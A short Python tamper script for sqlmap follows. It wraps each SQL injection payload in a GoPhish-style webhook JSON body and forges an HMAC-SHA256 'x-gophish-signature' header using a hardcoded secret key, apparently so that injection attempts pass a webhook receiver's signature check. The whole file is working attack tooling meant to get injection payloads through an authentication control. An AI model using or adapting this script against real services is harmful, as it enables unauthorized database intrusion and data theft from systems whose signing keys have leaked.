#!/usr/bin/python3
import hmac
import hashlib
from lib.core.enums import PRIORITY
__priority__ = PRIORITY.NORMAL

SECRET = b"3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS"

def tamper(payload, **kwargs):
    if not payload:
        return payload

    headers = kwargs.get("headers", {})

    json_body = (
        '{"campaign_id":1,"email":"%s","message":"Clicked Link"}' % payload.replace('"', '\\"')
    ).encode()

    sig = hmac.new(SECRET, json_body, hashlib.sha256).hexdigest()
    headers["x-gophish-signature"] = f"sha256={sig}"

    return payload
